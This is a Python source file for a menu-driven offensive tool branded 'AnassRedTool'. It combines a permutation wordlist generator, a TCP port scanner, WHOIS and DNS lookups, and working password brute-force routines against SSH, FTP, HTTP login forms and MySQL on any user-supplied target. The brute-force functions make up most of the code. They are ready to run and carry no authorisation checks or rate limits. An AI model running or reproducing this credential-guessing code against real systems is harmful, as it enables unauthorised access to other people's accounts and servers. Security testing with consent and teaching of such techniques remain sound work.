import os
import itertools
from rich.console import Console
from pyfiglet import Figlet
import paramiko
import time
import socket
from fpdf import FPDF
import ftplib
import requests
import mysql.connector
import threading
import dns.resolver
import whois

console = Console()

def clear_screen():
    os.system("clear")  

def banner():
    fig = Figlet(font="big")
    banner_text = fig.renderText("AnassRedTool")
    console.print(banner_text, style="bold red")
    console.print("A multi-functional tool by Anas Labrini", style="bold white on red", justify="center")
    console.rule(style="red")

def generate_wordlist():
    clear_screen()
    banner()
    
    words = []
    while True:
        word = console.input("[bold green]Enter a word (or type '[white]done[/]' to finish)> [/] ")
        if word.lower() == 'done':
            break
        words.append(word)

    output_file = console.input("[bold green]Enter output file name (e.g., wordlist.txt)> [/] ")
    min_words = int(console.input("[bold green]Minimum words in combo> [/] "))
    max_words = int(console.input("[bold green]Maximum words in combo> [/] "))

    with open(output_file, 'w') as file:
        for r in range(min_words, max_words + 1):
            for combo in itertools.permutations(words, r):
                password = ''.join(combo)
                file.write(password + '\n')

    console.print(f"\n Wordlist saved to: {output_file}", style="bold green")

def scan_network():
    clear_screen()
    banner()

    ip = console.input("[bold green]Enter the network IP to scan (e.g., 192.168.1.0): [/]")
    start_port = int(console.input("[bold green]Enter the starting port: [/]"))
    end_port = int(console.input("[bold green]Enter the ending port: [/]"))

    open_ports = []

    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()

    if open_ports:
        console.print(f"\n Open ports: {open_ports}", style="bold green")
    else:
        console.print(f"\n No open ports found", style="bold red")

    generate_report(open_ports, "network_scan_report.txt")

def generate_report(open_ports, filename="network_scan_report.txt"):
    with open(filename, 'w') as file:
        file.write("Network Scan Report\n")
        file.write("====================\n")
        file.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        if open_ports:
            file.write("Open Ports:\n")
            for port in open_ports:
                file.write(f"Port {port} is open\n")
        else:
            file.write("No open ports found\n")
    
    console.print(f"\n Report generated and saved as {filename}", style="bold green")

def brute_force_scan():
    clear_screen()
    banner()

    protocol = console.input("[bold green]Choose a protocol to attack (ftp/http/ssh/mysql): [/]").lower()
    target = console.input("[bold green]Enter the target IP or domain: [/]")
    username = console.input("[bold green]Enter username: [/]")
    wordlist_file = console.input("[bold green]Enter the wordlist file (e.g., wordlist.txt): [/]")
    
    try:
        with open(wordlist_file, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        console.print(f"[bold red]Error: The wordlist file was not found.[/]")
        return

    if protocol == "ssh":
        ssh_brute_force(target, username, passwords)
    elif protocol == "ftp":
        ftp_brute_force(target, username, passwords)
    elif protocol == "http":
        http_brute_force(target, username, passwords)
    elif protocol == "mysql":
        mysql_brute_force(target, username, passwords)
    else:
        console.print(f"[bold red]Invalid protocol selected![/]")

def ssh_brute_force(target, username, passwords):
    console.print(f"[bold green]Attempting to brute force SSH on {target} as {username}...[/]")
    for password in passwords:
        password = password.strip()
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, username=username, password=password, timeout=10)
            console.print(f"[bold green]Success! Found password: {password}[/]")
            break
        except paramiko.AuthenticationException:
            console.print(f"[bold yellow]Failed password: {password}[/]")
        except Exception as e:
            console.print(f"[bold red]Error: {str(e)}[/]")
        finally:
            client.close()

def ftp_brute_force(target, username, passwords):
    console.print(f"[bold green]Attempting to brute force FTP on {target} as {username}...[/]")
    for password in passwords:
        password = password.strip()
        try:
            ftp = ftplib.FTP(target)
            ftp.login(username, password)
            console.print(f"[bold green]Success! Found password: {password}[/]")
            break
        except ftplib.error_perm:
            console.print(f"[bold yellow]Failed password: {password}[/]")
        except Exception as e:
            console.print(f"[bold red]Error: {str(e)}[/]")

def http_brute_force(target, username, passwords):
    console.print(f"[bold green]Attempting to brute force HTTP on {target} as {username}...[/]")
    for password in passwords:
        password = password.strip()
        try:
            response = requests.post(f"http://{target}/login", data={"username": username, "password": password})
            if "Login successful" in response.text:
                console.print(f"[bold green]Success! Found password: {password}[/]")
                break
            else:
                console.print(f"[bold yellow]Failed password: {password}[/]")
        except Exception as e:
            console.print(f"[bold red]Error: {str(e)}[/]")

def mysql_brute_force(target, username, passwords):
    console.print(f"[bold green]Attempting to brute force MySQL on {target} as {username}...[/]")
    for password in passwords:
        password = password.strip()
        try:
            conn = mysql.connector.connect(
                host=target,
                user=username,
                password=password
            )
            if conn.is_connected():
                console.print(f"[bold green]Success! Found password: {password}[/]")
                break
        except mysql.connector.Error:
            console.print(f"[bold yellow]Failed password: {password}[/]")
        except Exception as e:
            console.print(f"[bold red]Error: {str(e)}[/]")


def whois_query():
    clear_screen()
    banner()
    domain = console.input("[bold green]Enter the domain name to query (e.g., google.com): [/]")
    try:
        domain_info = whois.whois(domain)
        console.print(f"[bold green]WHOIS Information for {domain}:[/]", style="bold green")
        console.print(domain_info)
    except Exception as e:
        console.print(f"[bold red]Error retrieving WHOIS information: {str(e)}[/]")

def dns_query():
    clear_screen()
    banner()
    domain = console.input("[bold green]Enter the domain name for DNS lookup (e.g., google.com): [/]")
    try:
        answers = dns.resolver.resolve(domain, 'A')
        console.print(f"[bold green]DNS Resolution for {domain}:[/]", style="bold green")
        for ipval in answers:
            console.print(f"IP address: {ipval.to_text()}")
    except Exception as e:
        console.print(f"[bold red]Error resolving DNS: {str(e)}[/]")

def main_menu():
    while True:
        clear_screen()
        banner()
        console.print("[1] - Generate Wordlist", style="bold cyan")
        console.print("[2] - Scan Network", style="bold cyan")
        console.print("[3] - Brute Force Attack", style="bold cyan")
        console.print("[4] - WHOIS Query", style="bold cyan")  
        console.print("[5] - DNS Query", style="bold cyan")   
        console.print("[6] - Exit", style="bold cyan")
        choice = console.input("\n[bold green]Choose a number> [/] ")

        if choice == '1':
            generate_wordlist()
            console.input("\n [bold green]Press Enter to return to the menu...[/] ")
        elif choice == '2':
            scan_network()
            console.input("\n [bold green]Press Enter to return to the menu...[/] ")
        elif choice == '3':
            brute_force_scan()
            console.input("\n [bold green]Press Enter to return to the menu...[/] ")
        elif choice == '4':  # تنفيذ استعلام WHOIS
            whois_query()
            console.input("\n [bold green]Press Enter to return to the menu...[/] ")
        elif choice == '5':  # تنفيذ استعلام DNS
            dns_query()
            console.input("\n [bold green]Press Enter to return to the menu...[/] ")
        elif choice == '6':
            console.print("\n👋 Goodbye!", style="bold red")
            break
        else:
            console.print("❌ Invalid selection. Try again.", style="bold yellow")

if __name__ == "__main__":
    main_menu()

